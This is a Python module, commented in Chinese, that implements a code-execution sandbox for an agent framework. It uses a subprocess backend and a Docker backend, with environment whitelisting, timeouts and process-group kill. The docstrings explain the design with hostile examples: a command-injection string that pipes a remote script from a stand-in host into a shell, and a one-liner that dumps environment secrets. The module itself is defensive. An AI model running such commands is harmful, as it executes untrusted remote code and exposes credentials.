"""代码执行沙箱。

这是整个框架里**风险最高**的模块：它会真的把代码跑起来。
下面每一行都在回答同一个问题 —— 「怎么让一段不可信的代码跑起来，但跑不出去」。

两种后端，按隔离强度与部署成本递增：

    subprocess（默认，零依赖）
        子进程 + 工作目录锁定 + 超时强杀 + 环境清洗。
        ⚠️ 它**不是隔离**：代码与宿主同用户、能读文件系统、能联网。
        对「跑 Agent 自己写的代码」够用；对「跑外部输入的代码」远远不够。

    docker（推荐用于不可信输入）
        --network=none + 内存/CPU/PID 上限 + 只读根文件系统，容器级隔离。
        需要本机有可用的 Docker；不可用时自动退回 subprocess 并告警。

无论哪种后端，下面五条都是硬性要求：

    1. 只执行工作区内的 .py 文件（路径先过 workspace.resolve 校验）
    2. 工作目录锁定在工作区
    3. 超时必杀，且杀**整个进程组** —— 只 kill 主进程的话，
       它 fork 出来的子进程会活下来继续跑
    4. 清空环境变量。这是最容易漏、也最致命的一条：
       项目 .env 里放着 DEEPSEEK_API_KEY，不清理的话，
       被执行的代码 `import os; print(os.environ)` 就能直接读走它
    5. 输出截断，防止一句 print 刷爆内存和 LLM 上下文
"""
from __future__ import annotations

import os
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from functools import lru_cache
from pathlib import Path

from app import workspace
from app.config import settings
from app.observability import get_logger, metrics

logger = get_logger("app.sandbox")

# 允许传给子进程的环境变量白名单。
# 名单刻意很短：任何带 KEY / TOKEN / SECRET / PASSWORD 的东西都不在里面。
_ENV_KEEP = {
    "PATH", "LANG", "LC_ALL", "SYSTEMROOT", "WINDIR", "TEMP", "TMP",
    "PYTHONIOENCODING", "PYTHONDONTWRITEBYTECODE", "SYSTEMDRIVE",
}


@dataclass
class ExecResult:
    """一次执行的结果。"""

    ok: bool
    exit_code: int
    stdout: str = ""
    stderr: str = ""
    duration: float = 0.0
    timed_out: bool = False
    backend: str = "subprocess"
    argv: list[str] = field(default_factory=list)

    def to_text(self) -> str:
        """转成回灌给模型的文本。"""
        head = (
            f"[执行结果] 后端={self.backend} 退出码={self.exit_code} "
            f"耗时={self.duration:.2f}s"
        )
        if self.timed_out:
            head += f"（超过 {settings.sandbox_timeout}s 被强制终止）"

        parts = [head]
        if self.stdout:
            parts.append("--- stdout ---\n" + self.stdout)
        if self.stderr:
            parts.append("--- stderr ---\n" + self.stderr)
        if not self.stdout and not self.stderr:
            parts.append("（没有任何输出）")
        return "\n".join(parts)


# ---------------------------------------------------------------------------
# 环境
# ---------------------------------------------------------------------------
def clean_env() -> dict[str, str]:
    """给子进程一份最小的环境变量。

    ⚠️ 绝不能把父进程环境原样传下去。项目 .env 里放着 DEEPSEEK_API_KEY，
    被执行的代码只要 `import os; print(os.environ)` 就能全部读走，
    再往网络上一发就出去了。白名单是本模块最不起眼、但最值钱的一段代码。
    """
    env = {k: v for k, v in os.environ.items() if k.upper() in _ENV_KEEP}
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONDONTWRITEBYTECODE"] = "1"  # 别在工作区里留 __pycache__
    env["SANDBOX"] = "1"  # 让被执行的代码知道自己在沙箱里
    # 让工作区根目录可被导入。pytest 默认只把「测试文件所在目录」放进 sys.path，
    # 于是 tests/test_x.py 里的 `from solution import ...` 会找不到工作区根下的 solution.py。
    # 不这样做的话，每个 Tester 都得在测试文件顶部手写一段 sys.path 把戏 ——
    # 那是噪音，而且十个测试里会有三个写错。
    env["PYTHONPATH"] = "."
    return env


@lru_cache(maxsize=1)
def docker_available() -> bool:
    """探测 Docker 是否真的可用（装了但没起 daemon 也算不可用）。"""
    try:
        probe = subprocess.run(
            ["docker", "info"], capture_output=True, timeout=8, check=False
        )
        return probe.returncode == 0
    except (OSError, subprocess.SubprocessError):
        return False


def active_backend() -> str:
    """实际生效的后端。配了 docker 但用不了时退回 subprocess。"""
    configured = (settings.sandbox_backend or "subprocess").strip().lower()
    if configured == "docker":
        if docker_available():
            return "docker"
        logger.warning(
            "配置了 docker 沙箱但 Docker 不可用（未安装或 daemon 未启动），本次退回 subprocess —— "
            "注意 subprocess 不是隔离，只适合执行可信代码"
        )
        return "subprocess"
    return "subprocess"


# ---------------------------------------------------------------------------
# 执行
# ---------------------------------------------------------------------------
def _popen_flags() -> dict:
    """让子进程自成一个进程组，为的是超时时能连锅端掉它派生的所有进程。"""
    if os.name == "nt":
        return {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
    return {"start_new_session": True}


def _kill_tree(proc: subprocess.Popen) -> None:
    """杀掉整个进程组。

    只 kill 主进程是不够的：它可能已经 fork 出别的进程，
    那些进程会活下来继续跑（继续吃 CPU、继续占着端口）。
    """
    try:
        if os.name == "nt":
            subprocess.run(
                ["taskkill", "/F", "/T", "/PID", str(proc.pid)],
                capture_output=True, timeout=10, check=False,
            )
        else:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError, OSError, subprocess.SubprocessError) as exc:
        logger.warning("进程组清理失败（%s），退回单进程 kill", exc)
        try:
            proc.kill()
        except OSError:
            pass


def _truncate(text: str) -> str:
    """超长输出只保留**尾部**。

    为什么保尾部而不是头部：报错信息（traceback 的最后几行）在末尾，
    那才是 Coder 真正需要看的东西；前面的输出多半是噪音。
    """
    limit = int(settings.sandbox_output_limit)
    if len(text) <= limit:
        return text
    return f"...（前 {len(text) - limit} 字符已省略）...\n" + text[-limit:]


def _decode(raw: bytes) -> str:
    return raw.decode("utf-8", errors="replace")


def _exec_subprocess(argv: list[str], workdir: Path) -> ExecResult:
    timeout = int(settings.sandbox_timeout)
    started = time.perf_counter()
    try:
        proc = subprocess.Popen(
            argv,
            cwd=str(workdir),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=clean_env(),
            **_popen_flags(),
        )
    except OSError as exc:
        return ExecResult(
            ok=False, exit_code=-1, stderr=f"无法启动进程：{exc}",
            duration=time.perf_counter() - started, backend="subprocess", argv=argv,
        )

    timed_out = False
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        _kill_tree(proc)
        # 杀掉之后必须再收一次尸，否则管道缓冲区里的残留会把子进程挂住
        stdout, stderr = proc.communicate()

    duration = time.perf_counter() - started
    return ExecResult(
        ok=(not timed_out and proc.returncode == 0),
        exit_code=proc.returncode if proc.returncode is not None else -9,
        stdout=_truncate(_decode(stdout or b"")),
        stderr=_truncate(_decode(stderr or b"")),
        duration=duration,
        timed_out=timed_out,
        backend="subprocess",
        argv=argv,
    )


def _exec_docker(argv: list[str], workdir: Path) -> ExecResult:
    timeout = int(settings.sandbox_timeout) + 15  # 给容器启动留点余量
    docker_cmd = [
        "docker", "run", "--rm",
        # 断网：最容易被忽略、也最值钱的一条。没有它，被执行的代码能把数据传出去
        "--network=none",
        f"--memory={int(settings.sandbox_max_memory_mb)}m",
        "--cpus=1",
        "--pids-limit=64",
        # 根文件系统只读，只给一个很小的可写 tmp
        "--read-only",
        "--tmpfs", "/tmp:rw,size=32m",
        "-v", f"{workdir}:/work",
        "-w", "/work",
        "-e", "PYTHONIOENCODING=utf-8",
        "-e", "PYTHONDONTWRITEBYTECODE=1",
        "-e", "SANDBOX=1",
        settings.sandbox_docker_image,
        *argv,
    ]

    started = time.perf_counter()
    try:
        proc = subprocess.run(
            docker_cmd, capture_output=True, timeout=timeout, check=False
        )
    except subprocess.TimeoutExpired:
        return ExecResult(
            ok=False, exit_code=-9, stderr="容器超时未返回（Docker 侧已强制结束）",
            duration=time.perf_counter() - started, timed_out=True,
            backend="docker", argv=argv,
        )
    except OSError as exc:
        return ExecResult(
            ok=False, exit_code=-1, stderr=f"无法启动 Docker：{exc}",
            duration=time.perf_counter() - started, backend="docker", argv=argv,
        )

    duration = time.perf_counter() - started
    return ExecResult(
        ok=(proc.returncode == 0),
        exit_code=proc.returncode,
        stdout=_truncate(_decode(proc.stdout or b"")),
        stderr=_truncate(_decode(proc.stderr or b"")),
        duration=duration,
        backend="docker",
        argv=argv,
    )


def _run(argv: list[str], workdir: Path) -> ExecResult:
    backend = active_backend()
    metrics.inc("sandbox_runs_total", backend=backend)
    logger.info("沙箱执行（%s）：%s", backend, " ".join(argv))
    result = _exec_docker(argv, workdir) if backend == "docker" else _exec_subprocess(argv, workdir)
    metrics.observe("sandbox_duration_seconds", result.duration, backend=backend)
    if not result.ok:
        metrics.inc("sandbox_failures_total", backend=backend,
                    reason="timeout" if result.timed_out else "nonzero_exit")
    return result


# ---------------------------------------------------------------------------
# 对外入口
# ---------------------------------------------------------------------------
def run_python(script: str, args: list[str] | None = None) -> ExecResult:
    """执行工作区内的一个 .py 文件。

    刻意不提供「执行任意命令」的接口：命令一旦可拼装，
    前面所有的路径校验都形同虚设（`python x.py; curl evil.sh | sh` 就能绕过去）。
    这里解释器固定、脚本必须是工作区内的 .py、参数单独传参不经 shell。
    """
    try:
        path = workspace.resolve(script)
    except workspace.WorkspaceError as exc:
        return ExecResult(ok=False, exit_code=-1, stderr=f"路径不合法：{exc}")

    if path.suffix.lower() != ".py":
        return ExecResult(ok=False, exit_code=-1, stderr=f"只能执行 .py 文件，收到：{script}")
    if not path.is_file():
        return ExecResult(ok=False, exit_code=-1, stderr=f"文件不存在：{script}")

    argv = [sys.executable, path.name, *(args or [])]
    # 用文件名而不是绝对路径：cwd 已经锁在工作区，绝对路径会把宿主的目录结构泄漏给代码
    return _run(argv, workspace.workspace_root())


def run_pytest(target: str = "tests") -> ExecResult:
    """在工作区里跑 pytest。

    Tester 写的测试放在约定的 tests/ 目录下，这里用 `python -m pytest` 执行。
    跑不了（没装 pytest / 目录不存在）时返回带说明的失败结果，
    而不是抛异常 —— 让 Coder 看到「测试没跑起来」这个事实，它通常会自己修正。
    """
    workdir = workspace.workspace_root()

    try:
        tests_dir = workspace.resolve(target)
    except workspace.WorkspaceError as exc:
        return ExecResult(ok=False, exit_code=-1, stderr=f"路径不合法：{exc}")

    if not tests_dir.exists():
        return ExecResult(
            ok=False, exit_code=-1,
            stderr=f"测试目录不存在：{target}（Tester 需要先写出测试文件）",
        )

    try:
        import pytest  # noqa: F401 - 只探测可用性，真正执行交给子进程
    except ImportError:
        return ExecResult(
            ok=False, exit_code=-1,
            stderr="当前解释器没有 pytest，无法运行测试。"
                   "请 `pip install pytest`，或改用 run_python 直接执行脚本。",
        )

    argv = [sys.executable, "-m", "pytest", target, "-q", "--no-header", "-p", "no:cacheprovider"]
    return _run(argv, workdir)
